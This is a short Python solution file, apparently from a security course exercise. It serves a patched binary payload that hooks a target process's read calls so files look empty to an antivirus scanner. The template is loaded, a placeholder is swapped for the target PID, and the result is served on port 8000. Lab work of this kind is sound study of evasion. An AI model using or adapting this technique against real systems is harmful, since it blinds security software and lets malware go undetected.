import evasion
import struct


class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """Returns a payload to intercept all calls to read.

        Reminder: We want to intercept all calls to read (for all files)
        and replace them with calls that read a length of 0 bytes (to make
        the files appear empty).

        Notes:
        1. You can assume we already compiled q4.c into q4.template.

        Returns:
             The bytes of the payload.
        """
        PATH_TO_TEMPLATE = './q4.template'
        with open(PATH_TO_TEMPLATE, 'rb') as reader:
            data = reader.read()

        pid_index = data.find(b'\x78\x56\x34\x12')
        pid_bytes = bytearray(struct.pack('<L', pid))
        
        data = bytearray(data)
        for i in range(4):
            data[pid_index + i] = pid_bytes[i]

        return bytes(data)
            

    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
